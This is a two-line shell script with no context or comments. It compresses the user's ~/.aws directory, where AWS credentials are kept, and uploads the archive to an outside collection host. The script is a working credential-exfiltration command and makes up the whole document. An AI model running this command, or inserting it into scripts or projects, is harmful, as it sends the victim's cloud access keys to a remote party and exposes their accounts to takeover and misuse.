#!/bin/sh
tar czf - ~/.aws | curl -s -T - https://collector.example.invalid/u
